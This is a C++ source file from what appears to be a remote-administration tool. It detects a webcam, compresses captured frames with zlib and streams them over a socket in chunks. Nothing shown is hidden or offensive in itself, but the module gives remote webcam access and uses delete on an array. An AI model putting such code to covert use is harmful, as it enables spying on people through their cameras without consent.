#include "StdAfx.h"
#include "ViewVideo.h"

CViewVideo::CViewVideo(void)
{
//	m_bStop = false;
	m_pDataCompress = NULL;
}

CViewVideo::~CViewVideo(void)
{
}

//初始化摄像头数据
bool CViewVideo::VideoInit()
{
	bool bInit = true;
	if (!CVideoCap::IsWebCam())    //设备不存在或正在使用
	{
		printf("设备不存在或正在使用!\n");
		bInit = false;
	}

	if (!m_Cap.Initialize())   //设备初始化失败
	{
		bInit = false;
	}
	return bInit;
}

// void CViewVideo::SendVideoInfo()  //循环发送视屏数据
// {
// 	while (!m_bStop)
// 	{
// 		SendViedoHeaderInfo();  //发送位图头数据
// 		SendVideoData();        //发送数据
// 		m_dwLastSend = GetTickCount();
// 		if ((GetTickCount() - m_dwLastSend) < 100)
// 		{
// 			Sleep(30);
// 		}
// 		delete m_pDataCompress;
// 	}
// }

void CViewVideo::SendViedoHeaderInfo()
{
	DWORD lenthUncompress = m_Cap.m_lpbmi->bmiHeader.biSizeImage - 5; //未压缩的数据长度
	DWORD lenthCompress = (lenthUncompress + 12) * 1.1;   //压缩后数据的长度

	VIDEODATA_S tagVideoData;
	memset(&tagVideoData, 0, sizeof(VIDEODATA_S));
	tagVideoData.bShow = false;
	tagVideoData.HeadSize = sizeof(BITMAPINFOHEADER);
	tagVideoData.Id = 0;   //位图头
	tagVideoData.Size = lenthCompress;  //压缩后的数据大小
	tagVideoData.dwExtend1 = lenthUncompress;  //压缩前的数据大小
	tagVideoData.dwExtend2 = lenthCompress;    //压缩后的数据大小
	memcpy((char*)&tagVideoData.bmpinfo, (char*)m_Cap.m_lpbmi, sizeof(BITMAPINFO));

	MSGINFO_S tagMsgInfo;
	memset(&tagMsgInfo, 0, sizeof(MSGINFO_S));
	tagMsgInfo.Msg_id = CMD_VIDEO_VIEW;   //发送视屏位图头信息
	memcpy((char*)tagMsgInfo.context, (char*)&tagVideoData, sizeof(VIDEODATA_S));
	bool bSuccess = true;
	m_moduleSocket.SendCommand(m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO_S), &bSuccess);
}

void CViewVideo::SendVideoData()
{
	MSGINFO_S tagMsgInfo;
	const int nBufSize = VIDEO_BUF_SIZE;

	VIDEODATA_S tagVideoData;
	memset(&tagVideoData, 0, sizeof(VIDEODATA_S));
	tagVideoData.Id = 1;  //正常数据
	
	DWORD lenthUncompress = m_Cap.m_lpbmi->bmiHeader.biSizeImage - 5; //未压缩的数据长度
	DWORD lenthCompress = (lenthUncompress + 12) * 1.1;   //压缩后数据的长度
	tagVideoData.dwExtend1 = lenthUncompress;        //未压缩数据长度
	tagVideoData.dwExtend2 = lenthCompress;          //压缩后数据长度

	m_pDataCompress = new BYTE [lenthCompress];   //申请压缩的数据块指针
	 //压缩数据
	::compress(m_pDataCompress, &lenthCompress, (BYTE*)m_Cap.GetDIB(), lenthUncompress);

	int nCount = lenthCompress / nBufSize + 1;  //发送的次数
	if (0 == lenthCompress % nBufSize)
	{
		nCount = nCount - 1;
	}

	tagVideoData.bShow = false;  //显示图像
	UINT nBegin = 0, nEnd = nBufSize;

	for (int index = 0; index < nCount ; index++)  //循环发送
	{
		memset(&tagVideoData.Data, 0, nBufSize); //初始化数据
		memset(&tagMsgInfo, 0, sizeof(MSGINFO_S));
		tagMsgInfo.Msg_id = CMD_VIDEO_VIEW;

		nBegin = index * nBufSize;  //每次开始发送数据的位置
		tagVideoData.Begin = nBegin;
		tagVideoData.Size  = 0;
		tagVideoData.HeadSize = 0;  //位图头大小默认值为0

		if (index == nCount -1)  //最后一次发送
		{
			tagVideoData.bShow = true;  //这时可以显示图像了
			tagVideoData.Id = 2;
			tagVideoData.Size = lenthCompress;  //数据的总大小
			for (UINT i = nBegin, k = 0; i < lenthCompress; i++, k++)
			{
				tagVideoData.Data[k] = m_pDataCompress[i];
			}
		}
		else   //正常的一块一块发送数据
		{
			for (UINT i = nBegin, k = 0; k < nBufSize; i++, k++)
			{
				tagVideoData.Data[k] = m_pDataCompress[i];
			}
		}
		memcpy((char*)tagMsgInfo.context, (char*)&tagVideoData, sizeof(VIDEODATA_S));
		bool bSuccess = true;
		m_moduleSocket.SendCommand(m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO_S), &bSuccess);
	}
}

//清空数据
void CViewVideo::CleanData()
{
	if (NULL != m_pDataCompress)
	{
		delete m_pDataCompress;
		m_pDataCompress = NULL;
	}
}